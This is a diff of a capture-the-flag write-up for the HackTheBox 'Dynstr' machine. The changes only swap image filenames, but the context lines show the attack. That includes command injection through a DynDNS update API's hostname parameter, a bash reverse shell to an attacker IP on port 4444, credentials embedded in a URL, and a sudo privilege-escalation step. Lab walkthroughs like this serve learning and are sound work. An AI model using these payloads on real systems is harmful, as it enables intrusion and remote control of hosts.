@@ -20,15 +20,15 @@ PORT   STATE SERVICE
 
 This was a corporate page for a DNS service:
 
-![](<../../../.gitbook/assets/image%20(2729).png>)
+![](../../../.gitbook/assets/dynstr-4.png)
 
 At the bottom, it appears we have to add `dyna.htb` to the `/etc/hosts` file:
 
-![](<../../../.gitbook/assets/image%20(2554).png>)
+![](../../../.gitbook/assets/dynstr-3.png)
 
 Also, there is some information on the page:
 
-![](<../../../.gitbook/assets/image%20(594).png>)
+![](../../../.gitbook/assets/dynstr-8.png)
 
 Since DNS is open, we can use `dig`:
 
@@ -106,7 +106,7 @@ badauth
 
 Weird. Googling "badauth DNS" shows us ths is an error caused by a DNS software called DynDns:
 
-![](<../../../.gitbook/assets/image%20(118).png>)
+![](../../../.gitbook/assets/dynstr-2.png)
 
 Googling `/nic/update` reveals that this is actually an API that we can access:
 
@@ -136,13 +136,13 @@ $ curl -G --data-urlencode 'hostname=$(curl 168431117/rce).no-ip.htb' http://dyn
 911 [nsupdate failed]
 ```
 
-![](<../../../.gitbook/assets/image%20(600).png>)
+![](../../../.gitbook/assets/dynstr-9.png)
 
 ```
 $ curl -G --data-urlencode 'hostname=$(bash -c "bash -i >& /dev/tcp/168431117/4444 0>&1").no-ip.htb' http://dynadns:sndanyd@dyna.htb/nic/updat
 ```
 
-![](<../../../.gitbook/assets/image%20(1027).png>)
+![](../../../.gitbook/assets/dynstr-1.png)
 
 ## Privilege Escalation
 
@@ -181,7 +181,7 @@ drwxr-xr-x 5 bindmgr bindmgr   4096 Mar 15  2021 ..
 
 When we read the debug script, we can find a SSH private key within it:
 
-![](<../../../.gitbook/assets/image%20(3215).png>)
+![](../../../.gitbook/assets/dynstr-5.png)
 
 I tried to use this to `ssh` in as the user, but it seems that we are being blocked. On enumeration of the `authorized_keys` file, we cansee that it only accepts requests from `*.infra.dyna.htb`.
 
@@ -215,7 +215,7 @@ www-data@dynstr:/etc/bind$ nsupdate -k infra.key
 
 Afterwards, we can `ssh` in as the user:
 
-![](<../../../.gitbook/assets/image%20(407).png>)
+![](../../../.gitbook/assets/dynstr-7.png)
 
 ### Sudo
 
@@ -319,4 +319,4 @@ sudo /usr/local/bin/bindmgr.sh
 /etc/bind/named.bindmgr/bash -p
 ```
 
-![](<../../../.gitbook/assets/image%20(3346).png>)
+![](../../../.gitbook/assets/dynstr-6.png)
